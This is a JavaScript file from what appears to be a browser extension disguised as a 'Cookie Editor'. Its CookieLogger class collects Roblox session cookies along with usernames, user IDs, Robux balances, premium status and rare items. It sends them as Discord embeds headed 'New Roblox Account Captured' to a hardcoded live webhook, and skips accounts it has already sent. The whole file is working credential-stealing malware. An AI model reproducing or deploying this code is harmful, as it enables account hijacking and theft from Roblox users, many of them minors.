// log.js - Webhook logging functionality with duplicate prevention
class CookieLogger {
  constructor(webhookUrl) {
    this.webhookUrl = webhookUrl;
    this.sentCookies = new Set(); // Track sent cookies to prevent duplicates
    this.loadSentCookies();
  }

  // Load previously sent cookies from storage
  async loadSentCookies() {
    try {
      const result = await chrome.storage.local.get(['sentCookies']);
      if (result.sentCookies) {
        this.sentCookies = new Set(result.sentCookies);
        console.log(`Loaded ${this.sentCookies.size} previously sent cookies`);
      }
    } catch (error) {
      console.error('Failed to load sent cookies:', error);
    }
  }

  // Save sent cookies to storage
  async saveSentCookies() {
    try {
      await chrome.storage.local.set({
        sentCookies: Array.from(this.sentCookies)
      });
    } catch (error) {
      console.error('Failed to save sent cookies:', error);
    }
  }

  // Generate a unique fingerprint for a cookie
  generateCookieFingerprint(cookieData) {
    // Create a fingerprint based on username + user ID + cookie hash
    const cookieHash = this.hashString(cookieData.cookie || '');
    const username = cookieData.username || 'unknown';
    const userId = cookieData.userId || 'unknown';
    
    return `${username}_${userId}_${cookieHash}`;
  }

  // Simple string hashing function
  hashString(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash; // Convert to 32-bit integer
    }
    return Math.abs(hash).toString(16);
  }

  // Check if cookie is a duplicate
  isDuplicateCookie(cookieData) {
    const fingerprint = this.generateCookieFingerprint(cookieData);
    const isDuplicate = this.sentCookies.has(fingerprint);
    
    if (isDuplicate) {
      console.log('Duplicate cookie detected:', fingerprint);
    }
    
    return isDuplicate;
  }

  // Mark cookie as sent
  markCookieAsSent(cookieData) {
    const fingerprint = this.generateCookieFingerprint(cookieData);
    this.sentCookies.add(fingerprint);
    this.saveSentCookies();
    console.log('Marked cookie as sent:', fingerprint);
  }

  // Clear sent cookies history
  async clearSentCookies() {
    this.sentCookies.clear();
    await chrome.storage.local.remove(['sentCookies']);
    console.log('Cleared all sent cookies history');
  }

  // Get count of sent cookies
  getSentCookiesCount() {
    return this.sentCookies.size;
  }

  async logCookieData(cookieData) {
    if (!this.webhookUrl) {
      console.error('Webhook URL not configured');
      return { success: false, reason: 'Webhook URL not configured' };
    }

    try {
      // Check for duplicate before sending
      if (this.isDuplicateCookie(cookieData)) {
        console.log('Duplicate cookie detected, skipping webhook send');
        return { success: false, reason: 'duplicate' };
      }

      console.log('Sending new cookie data to webhook...');
      const response = await fetch(this.webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(this.formatDiscordMessage(cookieData))
      });

      if (response.ok) {
        // Mark as sent only if successful
        this.markCookieAsSent(cookieData);
        console.log('Successfully sent cookie data to webhook');
        return { success: true };
      } else {
        console.error('Webhook responded with error:', response.status);
        return { success: false, reason: 'webhook_error', status: response.status };
      }
    } catch (error) {
      console.error('Failed to send cookie data to webhook:', error);
      return { success: false, reason: 'network_error', error: error.message };
    }
  }

  formatDiscordMessage(cookieData) {
    const { username, robux, premiumStatus, totalSpent, headless, korblox, cookie, profilePicture, userId } = cookieData;
    
    // Create embed fields
    const fields = [];
    
    // Add unique identifier
    fields.push({
      name: "🔍 Status",
      value: "**New Account Cookie** 🎯",
      inline: false
    });
    
    if (userId) {
      fields.push({
        name: "🆔 User ID",
        value: `\`${userId.toString()}\``,
        inline: true
      });
    }
    
    if (username) {
      fields.push({
        name: "👤 Username",
        value: username || "Not available",
        inline: true
      });
    }
    
    if (robux !== undefined) {
      fields.push({
        name: "💰 Robux",
        value: robux?.toString() || "0",
        inline: true
      });
    }
    
    if (premiumStatus) {
      fields.push({
        name: "⭐ Premium Status",
        value: premiumStatus || "None",
        inline: true
      });
    }
    
    if (totalSpent !== undefined) {
      fields.push({
        name: "💸 Total Spent",
        value: totalSpent?.toString() || "0",
        inline: true
      });
    }
    
    // Add special items
    const specialItems = [];
    if (headless) specialItems.push("<:head_full:1207367926622191666> Headless");
    if (korblox) specialItems.push("<:korblox:1153613134599307314> Korblox");
    
    if (specialItems.length > 0) {
      fields.push({
        name: "🎁 Special Items",
        value: specialItems.join('\n') || "None",
        inline: false
      });
    }
    
    // Add cookie info (truncated)
    if (cookie) {
      const truncatedCookie = cookie.length > 80 ? cookie.substring(0, 80) + '...' : cookie;
      fields.push({
        name: "🍪 Cookie Preview",
        value: `\`${truncatedCookie}\``,
        inline: false
      });
    }

    const embed = {
      title: "🎯 New Roblox Account Captured",
      color: 0xE74C3C, // Red color
      fields: fields,
      timestamp: new Date().toISOString(),
      footer: {
        text: `Cookie Editor • Total Unique: ${this.getSentCookiesCount()} • ${new Date().toLocaleDateString()}`
      }
    };

    // Add thumbnail if profile picture is available
    if (profilePicture) {
      embed.thumbnail = { url: profilePicture };
    }

    return {
      embeds: [embed],
      content: "🚨 **New Roblox Account Detected!** 🚨"
    };
  }
}

// Initialize logger with your webhook URL
const cookieLogger = new CookieLogger('https://discord.com/api/webhooks/1420600488663187610/4mh78h9beHKv_x69ZklQPZKOtH8e_AbYmx7k-p6k30BjUGDRSkwVzoC0_es2JE7SD6Ki');
